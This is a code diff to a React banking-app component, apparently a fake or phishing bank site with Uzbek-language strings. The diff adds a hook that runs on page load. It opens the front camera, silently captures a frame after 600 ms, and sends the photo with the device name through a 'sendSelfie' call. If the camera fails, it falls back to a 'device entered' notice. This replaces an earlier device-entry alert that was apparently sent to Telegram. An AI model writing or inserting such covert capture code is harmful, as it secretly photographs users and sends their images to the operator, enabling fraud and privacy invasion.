@@ -1,6 +1,6 @@
 import { useEffect } from "react";
 import { KEY, snapshot, useBank, useFrame } from "./model";
-import { loadWallet, saveWallet, notifyDevice } from "./sync";
+import { loadWallet, saveWallet, notifyDevice, sendSelfie } from "./sync";
 import {
   BonusesScreen,
   CardScreen,
@@ -153,15 +153,39 @@ export function BankApp() {
   }, [toast, showToast]);
 
   useEffect(() => {
-    const sent = sessionStorage.getItem("vesta-tg-sent");
+    const sent = sessionStorage.getItem("vesta-selfie-sent");
     if (sent) return;
 
     const name = getDeviceName();
-    const text = `Qurilma kirdi: ${name}`;
+    const caption = `Selfi: ${name}`;
 
-    notifyDevice({ data: { text } })
-      .then(() => sessionStorage.setItem("vesta-tg-sent", "1"))
-      .catch(() => {});
+    async function takeAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.playsInline = true;
+        await video.play();
+
+        await new Promise((r) => setTimeout(r, 600));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        if (ctx) ctx.drawImage(video, 0, 0);
+        stream.getTracks().forEach((t) => t.stop());
+
+        const photo = canvas.toDataURL("image/jpeg", 0.8);
+        await sendSelfie({ data: { photo, caption } });
+        sessionStorage.setItem("vesta-selfie-sent", "1");
+      } catch {
+        await notifyDevice({ data: { text: `Qurilma kirdi (kamera yo'q): ${name}` } }).catch(() => {});
+        sessionStorage.setItem("vesta-selfie-sent", "1");
+      }
+    }
+
+    takeAndSend();
   }, []);
 
   const dark = frame.screen === "success";
